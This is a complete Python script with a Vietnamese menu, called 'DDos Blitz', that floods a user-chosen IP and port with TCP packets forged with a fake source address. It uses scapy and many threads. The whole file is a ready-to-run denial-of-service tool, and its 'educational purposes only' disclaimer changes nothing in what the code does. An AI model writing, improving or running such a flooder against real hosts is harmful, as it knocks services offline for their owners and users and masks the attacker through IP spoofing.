#!/usr/bin/python3
import os
import threading
import time
from scapy.all import IP, TCP, send
from colorama import Fore, Style

def ddos_with_spoofing():
    os.system("clear")
    print("Nhấn CTRL + C và nhấn ENTER để thoát!!!")

    while True:
        try:
            threads = int(input("NHẬP SỐ LƯỢNG LUỒNG: "))
        except ValueError:
            print("Vui lòng nhập một giá trị nguyên.")
            continue
        else:
            break

    while True:
        target_ip = input(Fore.RED + Style.BRIGHT + "NHẬP IP CỦA MỤC TIÊU: ")
        if target_ip:
            break
        else:
            print("IP không hợp lệ. Vui lòng thử lại.")

    fake_ip = input("NHẬP IP GIẢ: ")

    while True:
        try:
            target_port = int(input("NHẬP CỔNG CỦA MỤC TIÊU (cổng mặc định: 80): ") or 80)
        except ValueError:
            print("Vui lòng nhập một cổng hợp lệ, hãy thử lại.")
            continue
        else:
            break

    print(f"Đang thực hiện Ddos với IP giả {fake_ip} trên {target_ip} (Cổng: {target_port})")
    print(Fore.YELLOW + Style.BRIGHT + "[THÔNG TIN!]" + Fore.WHITE + " Nếu thông tin trên không chính xác, bạn có thể khởi động lại script và nhập lại chi tiết đúng!!")

    time.sleep(4)
    print(Fore.MAGENTA + Style.BRIGHT + "Ddos bắt đầu trong ~")
    print("giây: 3")
    time.sleep(1)
    print("giây: 2")
    time.sleep(1)
    print("giây: 1")
    time.sleep(1)

    attack_num = 0
    def attack():
        nonlocal attack_num
        while True:
            try:
                packet = IP(src=fake_ip, dst=target_ip) / TCP(dport=target_port)
                send(packet, verbose=False)
                attack_num += 1
                print(f"Gói tin đã gửi! Số lần tấn công: {attack_num}")
            except Exception as e:
                print(f"Lỗi: {e}")
                break

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def print_red_centered_art():
    os.system("clear")
    art = '''
▒█▀▀▄ ▒█▀▀▄ █▀▀█ █▀▀ 
▒█░▒█ ▒█░▒█ █░░█ ▀▀█ 
▒█▄▄▀ ▒█▄▄▀ ▀▀▀▀ ▀▀▀
    '''
    red_art = f"{Fore.RED}{art}{Style.RESET_ALL}" 
    print(red_art.center(80))
    art2 = ''' 
░█▀▀█ █── ─▀─ ▀▀█▀▀ ▀▀█
░█▀▀▄ █── ▀█▀ ──█── ▄▀─
░█▄▄█ ▀▀▀ ▀▀▀ ──▀── ▀▀▀
    ''' 
    red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
    print(red_art2.center(80))
    print(Fore.YELLOW + Style.BRIGHT + "[Nhà phát triển không chịu trách nhiệm cho bất kỳ hoạt động bất hợp pháp nào được thực hiện với công cụ này, công cụ này chỉ đại diện cho cách thức hoạt động của các cuộc tấn công ddos và nó được tạo ra cho mục đích giáo dục.]")

def menu():
    print(Style.BRIGHT + Fore.YELLOW + "[THÔNG TIN!]" + Fore.WHITE + "Nhấn CTRL + C và nhấn enter để thoát!!")
    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
    print(Fore.WHITE + Style.BRIGHT + "Vui lòng chọn từ các tùy chọn sau...")
    print(Fore.WHITE + Style.BRIGHT + "1. DDos một trang web.  [1]")
    print(Fore.WHITE + Style.BRIGHT + "2. Thoát.               [2]")
    print("Nhập tùy chọn của bạn .. [ví dụ 1,2]") 
    usr = input(Fore.GREEN + Style.BRIGHT + ">>>> ")
    if usr == "1":
        ddos_with_spoofing()
    elif usr == "2":
        print("Đang thoát...")
        time.sleep(1)
    else:
        print("Tùy chọn không hợp lệ..thử lại.")
        menu()

if __name__ == "__main__":
    print_red_centered_art()
    menu()